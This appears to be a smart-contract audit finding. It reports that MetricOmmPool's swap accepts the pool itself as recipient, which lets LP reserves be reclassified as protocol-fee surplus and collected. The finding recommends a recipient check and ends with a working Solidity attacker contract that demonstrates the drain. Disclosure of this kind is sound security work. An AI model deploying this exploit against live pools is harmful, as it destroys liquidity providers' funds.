### Title
Swap Output Sent to Pool Itself Silently Drains LP Reserves Into Protocol-Fee Surplus — (`metric-core/contracts/MetricOmmPool.sol`)

---

### Summary

The `swap` function in `MetricOmmPool` transfers output tokens to `recipient` **before** verifying the callback payment, but never validates that `recipient != address(this)`. When a caller sets `recipient = address(pool)`, the ERC20 transfer succeeds (self-transfer), the pool's real token balance is unchanged, yet `binTotals.scaledToken(0|1)` has already been decremented by `_executeSwap`. The resulting accounting gap is permanently classified as protocol-fee surplus and extracted on the next `collectFees` call, irrecoverably reducing LP claims.

---

### Finding Description

**Structural analog to the GNTDeposit bug:**

In GNTDeposit, `balances[msg.sender]` is decremented as sender but the corresponding increment (when `addr == msg.sender`) is silently overwritten by the final `balances[msg.sender] = balance` write. The invariant `balances[x] == credits − debits` is broken for the self-referential address.

In Metric OMM the same invariant is:

```
balance1() * TOKEN_1_SCALE_MULTIPLIER == binTotals.scaledToken1 + notionalFee1Scaled + surplus
```

The pool enforces this by (a) decrementing `binTotals.scaledToken1` inside `_executeSwap` and (b) physically sending token1 out via `transferToken1`. When `recipient == address(pool)`, step (b) is a no-op on the real balance, but step (a) already fired. The invariant is broken: `binTotals.scaledToken1` is too low relative to `balance1()`, and the gap is silently absorbed as surplus.

**Exact code path (`zeroForOne` direction):**

```solidity
// MetricOmmPool.sol lines 247-263
(int256 amount0Delta, int256 amount1Delta, uint256 protocolFeeAmount) =
    _executeSwap(zeroForOne, amountSpecified, params);
// ↑ binTotals.scaledToken1 decremented here (line 739)

if (zeroForOne) {
    if (amount1Delta < 0) {
        transferToken1(recipient, uint256(-amount1Delta));   // ← self-transfer if recipient == pool
    }
    uint256 balance0Before = balance0();
    IMetricOmmSwapCallback(msg.sender).metricOmmSwapCallback(...);
    if (amount0Delta > 0 && balance0Before + uint256(amount0Delta) > balance0()) {
        revert IncorrectDelta();   // ← only checks INPUT token; output destination unchecked
    }
}
```

The `IncorrectDelta` guard verifies only that the pool received the correct **input** token (token0). It says nothing about where the **output** token (token1) went. There is no `require(recipient != address(this))` anywhere in the function.

**Surplus extraction path:**

```solidity
// MetricOmmPool.sol lines 385-388
uint256 surplus1Scaled =
    balance1() * TOKEN_1_SCALE_MULTIPLIER
    - uint256(binTotals.scaledToken1)      // ← artificially low after attack
    - notionalFee1AmountScaled;
```

`collectFees` (line 364) distributes this surplus to admin and protocol. Because `binTotals.scaledToken1` was decremented but `balance1()` was not, `surplus1Scaled` is inflated by exactly the output amount of the attack swap. The next `collectFees` call extracts it permanently.

---

### Impact Explanation

Every LP's proportional claim on token1 is computed from `binTotals.scaledToken1`. After the attack, that value is understated. When LPs call `removeLiquidity`, they receive:

```
amount1Scaled = binState.token1BalanceScaled * sharesToRemove / binTotalSharesVal
```

The missing token1 (now in surplus) is not accessible to LPs via any path. It is a permanent, irrecoverable loss of LP principal, transferred to the protocol fee pool. The attack is repeatable: each swap with `recipient = address(pool)` drains another slice of LP reserves.

---

### Likelihood Explanation

- **Trigger**: Any address that can call `swap` (no role restriction) can set `recipient = address(pool)`. The pool is not paused by default.
- **Cost to attacker**: The attacker must pay the input token (token0) and receives nothing in return. This is a griefing attack; the attacker's loss equals the LP's loss at oracle price.
- **Motivation**: A competitor, a malicious factory operator who later calls `collectFees`, or any actor willing to spend funds to harm LPs.
- **Detection**: Silent — no event distinguishes a self-recipient swap from a normal one; `Swap` is emitted with the pool address as `recipient`.

Likelihood: **Medium** (unprivileged, zero-code-change trigger; attacker must spend capital).

---

### Recommendation

Add a recipient validation at the top of `swap`:

```solidity
require(recipient != address(this), InvalidRecipient());
```

Alternatively, validate inside the output-transfer branches:

```solidity
if (amount1Delta < 0) {
    require(recipient != address(this), InvalidRecipient());
    transferToken1(recipient, uint256(-amount1Delta));
}
```

This mirrors the fix recommended for GNTDeposit (`require(addr != msg.sender)`) — reject the degenerate self-referential case before any state mutation occurs.

---

### Proof of Concept

```solidity
// Attacker contract
contract DrainLPReserves is IMetricOmmSwapCallback {
    IMetricOmmPoolActions pool;
    IERC20 token0;

    constructor(address _pool, address _token0) {
        pool = IMetricOmmPoolActions(_pool);
        token0 = IERC20(_token0);
    }

    // Step 1: approve token0, then call this
    function attack(int128 amountIn) external {
        token0.approve(address(pool), type(uint256).max);
        // recipient = address(pool) — output token1 goes to pool itself
        pool.swap(
            address(pool),   // ← recipient is the pool
            true,            // zeroForOne: pay token0, "receive" token1
            amountIn,        // exact input
            0,               // no price limit
            "",
            ""
        );
        // After this call:
        // - pool.balance1() unchanged
        // - pool.binTotals.scaledToken1 decreased by output amount
        // - surplus1Scaled inflated by output amount
        // - next collectFees() extracts LP token1 as protocol fees
    }

    function metricOmmSwapCallback(int256 amount0Delta, int256, bytes calldata) external {
        // Pay the input token0 — attacker loses this
        if (amount0Delta > 0) {
            token0.transfer(msg.sender, uint256(amount0Delta));
        }
    }
}
```

**Invariant check (post-attack):**

```
balance1() * TOKEN_1_SCALE_MULTIPLIER
    > binTotals.scaledToken1 + notionalFee1Scaled
```

The gap equals the output amount of the attack swap. On the next `collectFees`, this gap is distributed as admin/protocol fees, permanently reducing LP claims.